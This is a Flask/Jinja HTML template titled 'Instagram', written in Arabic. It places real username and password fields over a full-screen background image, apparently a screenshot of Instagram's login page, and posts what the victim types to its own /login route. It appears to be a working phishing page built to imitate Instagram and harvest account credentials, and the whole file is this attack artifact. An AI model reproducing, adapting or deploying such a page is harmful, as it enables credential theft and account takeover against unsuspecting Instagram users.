<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    html, body {
        height: 100%;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        overflow: hidden;
    }

    /* الصورة كخلفية كاملة */
    body {
        background-image: url("{{ url_for('static', filename='login-bg.png') }}");
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        background-attachment: fixed;
    }

    /* طبقة شفافة فوق الصورة */
    .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: transparent;
        z-index: 1;
    }

    /* الحقول الفعلية فوق الصورة */
    .form-fields {
        position: fixed;
        z-index: 10;
        top: 22%;
        left: 8%;
        width: 380px;
        display: flex;
        flex-direction: column;
        gap: 14px;
    }

    .form-fields input {
        width: 100%;
        padding: 16px 20px;
        background: rgba(26, 26, 26, 0.95);
        border: 1px solid #363636;
        border-radius: 12px;
        color: #fff;
        font-size: 15px;
        outline: none;
        text-align: right;
        font-family: inherit;
    }

    .form-fields input::placeholder { color: #737373; }
    .form-fields input:focus { border-color: #555; background: rgba(31, 31, 31, 0.98); }

    .form-fields button {
        width: 100%;
        padding: 14px;
        background: #0064e0;
        color: #fff;
        border: none;
        border-radius: 12px;
        font-size: 15px;
        font-weight: 600;
        cursor: pointer;
        font-family: inherit;
        margin-top: 8px;
        transition: background 0.2s;
    }

    .form-fields button:hover { background: #0052b8; }

    .alert {
        padding: 12px;
        border-radius: 10px;
        background: rgba(237, 66, 69, 0.15);
        border: 1px solid rgba(237, 66, 69, 0.3);
        color: #ed4245;
        font-size: 14px;
        text-align: center;
    }
</style>
</head>
<body>

<div class="overlay"></div>

<form class="form-fields" method="POST" action="/login">
    {% if error %}
        <div class="alert">{{ error }}</div>
    {% endif %}
    <input type="text" name="username" placeholder="رقم الهاتف المحمول أو اسم المستخدم أو البريد الإلكتروني" required autofocus>
    <input type="password" name="password" placeholder="كلمة السر" required>
    <button type="submit">تسجيل الدخول</button>
</form>

</body>
</html>
